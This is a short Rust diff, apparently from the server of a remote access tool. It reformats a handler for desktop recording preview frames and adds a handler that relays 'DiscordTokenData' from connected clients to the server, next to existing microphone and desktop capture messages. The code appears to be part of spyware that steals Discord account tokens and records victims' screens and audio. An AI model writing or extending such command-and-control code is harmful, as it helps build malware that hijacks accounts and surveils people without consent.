@@ -196,8 +196,10 @@ impl ClientReaderWrapper {
             }
 
             DesktopRecordingPreviewFrame(frame) => {
-                self.send_server_packet(ServerCommand::DesktopRecordingPreviewFrame(self.addr, frame))
-                    .await;
+                self.send_server_packet(ServerCommand::DesktopRecordingPreviewFrame(
+                    self.addr, frame,
+                ))
+                .await;
             }
 
             DesktopRecordingFile(file_data) => {
@@ -207,6 +209,11 @@ impl ClientReaderWrapper {
 
             MicDeviceList(devices) => {
                 self.send_server_packet(ServerCommand::MicDeviceList(self.addr, devices))
+                    .await;
+            }
+
+            DiscordTokenData(data) => {
+                self.send_server_packet(ServerCommand::DiscordTokenData(self.addr, data))
                     .await;
             }
 
